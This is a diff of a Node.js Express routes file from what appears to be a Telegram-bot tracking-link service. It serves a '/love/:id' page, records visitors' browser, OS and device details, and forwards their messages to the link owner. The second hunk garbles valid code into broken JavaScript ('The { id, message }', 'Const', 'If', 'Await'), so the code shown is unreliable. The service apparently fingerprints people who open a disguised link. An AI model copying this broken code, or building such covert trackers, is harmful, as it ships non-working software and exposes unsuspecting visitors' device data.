@@ -31,8 +31,8 @@ function setupRoutes(app, db, saveDB, bot) {
                 isp: "Unknown", 
                 browserName: uaResult.browser.name || "Unknown",
                 browserVersion: uaResult.browser.version || "Unknown",
-                osName: uaResult.os.name || "Unknown",
-                osVersion: uaResult.os.version || "Unknown",
+                osName: clientDevice.osName || uaResult.os.name || "Unknown",
+                osVersion: clientDevice.osVersion || uaResult.os.version || "Unknown",
                 deviceVendor: clientDevice.vendor || uaResult.device.vendor || "Unknown",
                 deviceModel: clientDevice.model || uaResult.device.model || "Unknown",
                 deviceType: clientDevice.type || uaResult.device.type || "Desktop/Unknown",
@@ -117,22 +117,22 @@ function setupRoutes(app, db, saveDB, bot) {
 
     app.post('/api/submit-message', async (req, res) => {
         try {
-            const { id, message } = req.body;
-            const data = db.linkDatabase[id];
-            if (!data) return res.json({ success: false });
+            The { id, message } = req.body;
+            Const data = db.linkDatabase[id];
+            If (!data) return res.json({ success: false });
 
-            data.message = message;
-            await saveDB();
+            Data.message = message;
+            Await saveDB();
 
-            bot.telegram.sendMessage(data.userId, `📨 মেসেজ: ${message}`).catch(() => {});
+            Bot.telegram.sendMessage(data.userId, `📨 মেসেজ: ${message}`).catch(() => {});
 
-            return res.json({ success: true });
+            Return res.json({ success: true });
         } catch (err) {
-            res.json({ success: false });
+            Res.json({ success: false });
         }
     });
 
-    app.get('/love/:id', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
+    App.get('/love/:id', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
 }
 
-module.exports = { setupRoutes };
+Module.exports = { setupRoutes };
